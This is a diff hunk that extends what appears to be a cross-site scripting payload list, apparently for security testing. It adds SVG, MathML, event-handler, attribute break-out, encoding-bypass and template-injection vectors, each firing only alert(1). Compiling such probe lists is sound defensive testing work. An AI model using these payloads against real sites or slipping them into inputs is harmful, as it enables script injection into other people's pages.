@@ -19,3 +19,41 @@ javascript:alert(1)
 <iframe src="javascript:alert(1)">
 %3Cscript%3Ealert(1)%3C/script%3E
 &lt;script&gt;alert(1)&lt;/script&gt;
+# SVG vectors
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x></svg>
+<svg><set attributeName=onmouseover to=alert(1)></set></svg>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
+<svg><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"></iframe></foreignObject></svg>
+# MathML vectors
+<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">
+<math href="javascript:alert(1)">CLICK</math>
+# Event handler variants
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<form><button formaction=javascript:alert(1)>click
+<isindex action=javascript:alert(1) type=image>
+<input type=image src=x onerror=alert(1)>
+<table background=javascript:alert(1)>
+<link rel=stylesheet href=javascript:alert(1)>
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+# Attribute injection / break-out
+"><img src=x onerror=alert(1) x="
+' onmouseover='alert(1)
+" onmouseover="alert(1)
+` onmouseover=`alert(1)`
+><img src=x onerror=alert(1)><"
+# Encoding bypass probes
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\u003cscript\u003ealert(1)\u003c/script\u003e
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#60;script&#62;alert(1)&#60;/script&#62;
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<scr\x09ipt>alert(1)</scr\x09ipt>
+<IMG """><SCRIPT>alert(1)</SCRIPT>">
+# Template injection probes (Angular/Vue/etc)
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+<%= alert(1) %>
